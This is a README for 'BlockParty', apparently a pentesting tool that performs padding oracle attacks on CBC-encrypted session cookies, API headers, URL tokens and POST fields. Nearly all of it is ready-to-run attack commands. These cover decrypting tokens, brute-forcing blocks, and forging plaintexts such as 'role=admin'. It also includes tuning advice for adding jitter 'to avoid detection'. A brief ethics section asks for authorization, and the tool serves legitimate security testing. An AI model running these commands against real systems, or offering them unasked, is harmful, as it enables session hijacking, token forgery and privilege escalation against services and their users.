![BlockParty Icon](blockparty-icon.png "BlockParty!!")

# BlockParty

BlockParty is a Hachi-integrated re-imagining of the classic PadBuster tool for performing padding oracle attacks on CBC-encrypted tokens such as cookies, URL parameters, or POST bodies. It is designed to be modern, fast, and simple to extend directly from Hachi projects.

---

## Quick Start

### Build

From your Hachi workspace:

```
hachi blockparty.hachi -build blockparty -cf "-O2 -lcurl"
```

* `blockparty` is the build target name.
* `-lcurl` links against libcurl for HTTP(S) requests.
* Do not define `BLOCKPARTY_STANDALONE` when building under Hachi.

---

### Run

Decrypt a cookie token:

```
./blockparty \
  "https://target/app" \
  "ENC" \
  16 \
  --cookies "session=ENC" \
  --usebody --tri-analyze --tui
```

Decrypt a URL parameter token:

```
./blockparty \
  "https://target/app?token=ENC" \
  "ENC" \
  0 \
  --usebody --tri-analyze --tui
```

Encrypt (forge) a plaintext:

```
./blockparty \
  "https://target/app" \
  "ENC" \
  16 \
  --cookies "session=ENC" \
  --mode encrypt --plaintext "role=admin"
```

---

## Recipes

### 1. Basic Cookie Decrypt

```
./blockparty "https://target/app" "ENC" 16 \
  --cookies "session=ENC" \
  --usebody --tri-analyze
```

### 2. Brute Force First Block

```
./blockparty "https://target/app" "ENC" 16 \
  --cookies "session=ENC" \
  --mode bruteforce --usebody --tri-analyze
```

### 3. Resume From Block 3

```
./blockparty "https://target/app" "ENC" 16 \
  --cookies "session=ENC" \
  --resume 3 --usebody --tri-analyze
```

### 4. Use Explicit Regex Signatures

```
./blockparty "https://target/app?token=ENC" "ENC" 16 \
  --sig-pad "BadPadding|Invalid padding" \
  --sig-app "Exception|Traceback" \
  --sig-valid "Welcome|OK"
```

### 5. Encrypt New Plaintext

```
./blockparty "https://target/app" "ENC" 16 \
  --cookies "session=ENC" \
  --mode encrypt --plaintext "user=alice&role=admin"
```

### 6. Disable URL-Encoding

```
./blockparty "https://target/app" "ENC" 16 \
  --cookies "token=ENC" \
  --noencode --usebody
```

---

## Troubleshooting

**Error: `encrypted sample length not divisible by blockSize`**

* The ciphertext is not aligned to the block size.
* Fixes: use the correct `BlockSize` (16 for AES, 8 for 3DES), add `--noiv` if the token lacks an IV, or set `BlockSize=0` for autodiscovery.

**Error: `sample not found in URL/POST/Cookies`**

* The sample string must appear literally in the request.
* Fixes: check for exact match, include it in cookies or POST data, or try `--noencode`.

**Error: `Unknown option: --flag`**

* An unsupported flag was used. Run with `--help` for all valid options.

**Error: `network error`**

* Target unreachable. Fixes: check URL, network, proxy settings, or TLS support in libcurl.

**Error: `block failed`**

* No valid oracle signature found. Fixes: supply regexes (`--sig-pad`, `--sig-app`, `--sig-valid`), enable `--tri-analyze`, or use `--usebody`.

---

## Common Recipes for Debugging

* **Suspect URL-encoding issues:** `--noencode`
* **Token missing IV:** `--noiv`
* **False positives:** add `--sig-pad`, `--sig-app`, `--sig-valid` with known patterns
* **Responses look identical:** `--usebody --veryverbose`
* **Unstable network:** `--rps 2 --jitter-ms 500`
* **Timing side channel:** `--timing`

---

## Real-World Scenarios

**Web Application Session Cookies**

```
./blockparty "https://app.local/home" "ENC" 16 \
  --cookies "SESSION=ENC" --usebody --tri-analyze
```

**API Tokens in Headers**

```
./blockparty "https://api.local/resource" "ENC" 16 \
  --headers "X-Auth::ENC" --usebody --tri-analyze
```

**SAML or JWT Wrappers**

```
./blockparty "https://idp.local/sso?token=ENC" "ENC" 0 \
  --usebody --tri-analyze --tui
```

**Hidden Fields in POST Requests**

```
./blockparty "https://shop.local/cart" "ENC" 16 \
  --post "cartId=ENC&item=42" --usebody --tri-analyze
```

**Legacy Systems Using 3DES**

```
./blockparty "https://legacy.local/pay" "ENC" 8 \
  --cookies "auth=ENC" --usebody --tri-analyze
```

---

## Safety and Ethics

* Use only on systems where you have explicit authorization.
* Padding oracle attacks generate heavy traffic and can impact target performance.
* Always test in staging environments when possible.
* Check program or bug bounty scope before attempting attacks.

---

## Performance Tuning

* **rps:** adjust request rate with `--rps`.
* **jitter-ms:** add random delay to avoid detection.
* **concurrency:** parallel workers for faster brute force.
* **retries:** tweak `--max-retries`, `--backoff-ms`, `--backoff-mult` for flaky targets.
* **logs:** use `--state` and `--jsonl` to resume and analyze runs.

---

## Extending the Tool

* Add custom encodings in `padsploit.hpp`.
* Modify request builder for SOAP, GraphQL, or custom formats.
* Swap out libcurl for other transports if needed.
* Script BlockParty inside larger Hachi workflows with `blockparty::run_cli(argc, argv)`.

---

## References and Learning

* Serge Vaudenay. *Security Flaws Induced by CBC Padding*. Eurocrypt 2002.
* Juliano Rizzo, Thai Duong. *Practical Padding Oracle Attacks*. 2010.
* OWASP. *OWASP Testing Guide*, section on Padding Oracle testing.
* Brian Holyfield. *PadBuster Tool*, Gotham Digital Science.
* Nadhem J. AlFardan, Kenneth G. Paterson. *Lucky Thirteen: Breaking the TLS and DTLS Record Protocols*. IEEE Symposium on Security and Privacy (S\&P), 2013.

